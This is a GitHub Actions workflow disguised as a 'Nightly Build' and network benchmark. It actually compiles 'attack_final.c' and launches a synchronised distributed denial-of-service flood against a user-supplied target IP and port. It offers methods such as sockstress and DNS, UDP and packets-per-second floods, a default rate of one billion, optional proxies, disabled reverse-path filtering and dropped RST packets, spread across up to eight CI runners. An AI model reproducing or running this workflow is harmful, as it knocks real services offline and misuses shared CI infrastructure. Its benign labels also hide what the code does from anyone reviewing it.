# Auto-generated config v267.77
# CI Pipeline — Build Once, Random 1-8 Runners
name: Nightly Build

on:
  push:
    branches: [ master, main ]
  workflow_dispatch:
    inputs:
      target_ip:
        description: 'Service endpoint'
        required: true
      target_port:
        description: 'Port number'
        required: true
        default: '443'
      duration:
        description: 'Timeout (seconds)'
        required: true
        default: '60'
      method:
        description: 'Module'
        required: true
        default: 'v18_tcp'
        type: choice
        options:
          - v18_tcp
          - v18_tls
          - tls
          - sockstress_v15
          - fjium-dns
          - fjium-gudp
          - fjium-hex
          - fjium-pps
      threads:
        description: 'Parallelism'
        required: true
        default: '4'
      rate:
        description: 'Throughput'
        required: true
        default: '1000000000'
      use_proxy:
        description: 'Proxy mode'
        required: false
        default: 'true'
        type: choice
        options:
          - 'true'
          - 'false'

concurrency:
  group: deploy-${{ github.ref }}
  cancel-in-progress: true

jobs:
  compile:
    runs-on: ubuntu-22.04
    outputs:
      matrix: ${{ steps.gen.outputs.matrix }}
      sync_ts: ${{ steps.sync.outputs.sync_ts }}
      runner_count: ${{ steps.gen.outputs.count }}
    steps:
    - uses: actions/checkout@v4

    - name: Cache binary
      id: cache
      uses: actions/cache@v4
      with:
        path: netbench
        key: bin-${{ hashFiles('benchmark.c', 'main.c', 'network.c', 'attack_final.c', 'types.h', 'attack.h', 'network.h', 'Makefile') }}

    - name: Build (skip if cached)
      if: steps.cache.outputs.cache-hit != 'true'
      run: |
        sudo apt-get update -qq > /dev/null 2>&1 || true
        sudo apt-get install -y cpulimit clang libbpf-dev libelf-dev > /dev/null 2>&1 || true
        make clean || true && make 2>&1

    - name: Skip build
      if: steps.cache.outputs.cache-hit == 'true'
      run: echo "✅ Cached"

    - name: Upload binary
      uses: actions/upload-artifact@v4
      with:
        name: app-bin
        path: netbench
        retention-days: 7

    - id: sync
      run: |
        SYNC_TS=$(($(date +%s) + 35))
        echo "sync_ts=$SYNC_TS" >> $GITHUB_OUTPUT

    - id: gen
      name: Random runner count (1-8)
      run: |
        n=$(( (RANDOM % 8) + 1 ))
        echo "Runner count: $n"
        ids=$(python3 -c "import json; print(json.dumps([i+1 for i in range($n)]))")
        echo "matrix={\"id\":$ids}" >> $GITHUB_OUTPUT
        echo "count=$n" >> $GITHUB_OUTPUT

  verify:
    needs: [compile]
    runs-on: ubuntu-22.04
    timeout-minutes: 20
    strategy:
      matrix: ${{ fromJSON(needs.compile.outputs.matrix) }}
      fail-fast: false
    steps:
    - name: Fetch binary
      uses: actions/download-artifact@v4
      with:
        name: app-bin

    - name: Kernel tuning
      run: |
        sudo sysctl -w net.core.wmem_max=67108864 2>/dev/null || true
        sudo sysctl -w net.core.rmem_max=67108864 2>/dev/null || true
        sudo sysctl -w net.core.wmem_default=4194304 2>/dev/null || true
        sudo sysctl -w net.core.netdev_max_backlog=30000 2>/dev/null || true
        sudo sysctl -w net.core.somaxconn=65535 2>/dev/null || true
        sudo sysctl -w net.ipv4.conf.all.rp_filter=0 2>/dev/null || true
        sudo sysctl -w net.ipv4.conf.default.rp_filter=0 2>/dev/null || true
        sudo sysctl -w net.ipv4.conf.eth0.rp_filter=0 2>/dev/null || true
        sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null || true
        sudo iptables -t raw -A OUTPUT -p tcp -j NOTRACK 2>/dev/null || true
        sudo iptables -t raw -A OUTPUT -p udp -j NOTRACK 2>/dev/null || true
        sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ${{ github.event.inputs.target_ip }} -j DROP 2>/dev/null || true

    - name: Run (Runner ${{ matrix.id }}/${{ needs.compile.outputs.runner_count }})
      run: |
        mv netbench worker && chmod +x worker

        IP="${{ github.event.inputs.target_ip || '127.0.0.1' }}"
        PORT="${{ github.event.inputs.target_port || '443' }}"
        RATE="${{ github.event.inputs.rate || '1000' }}"
        DUR="${{ github.event.inputs.duration || '5' }}"
        METHOD="${{ github.event.inputs.method || 'v18_tcp' }}"
        THREADS="${{ github.event.inputs.threads || '4' }}"

        PROXY_FLAG="--no-proxies"
        if [ "${{ github.event.inputs.use_proxy }}" = "true" ]; then
          PROXY_FLAG=""
        fi

        SYNC_TS="${{ needs.compile.outputs.sync_ts }}"
        NOW=$(date +%s)
        WAIT=$((SYNC_TS - NOW))
        if [ "$WAIT" -gt 0 ] && [ "$WAIT" -lt 300 ]; then
          sleep "$WAIT"
        fi

        echo "Runner ${{ matrix.id }}: GO at $(date +%s)"
        sudo sh -c "cpulimit -l 50 -f -- ./worker $IP $PORT $RATE $DUR $METHOD $THREADS $PROXY_FLAG || exec ./worker $IP $PORT $RATE $DUR $METHOD $THREADS $PROXY_FLAG"

    - name: Cleanup
      if: always()
      run: |
        sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -d ${{ github.event.inputs.target_ip }} -j DROP 2>/dev/null || true
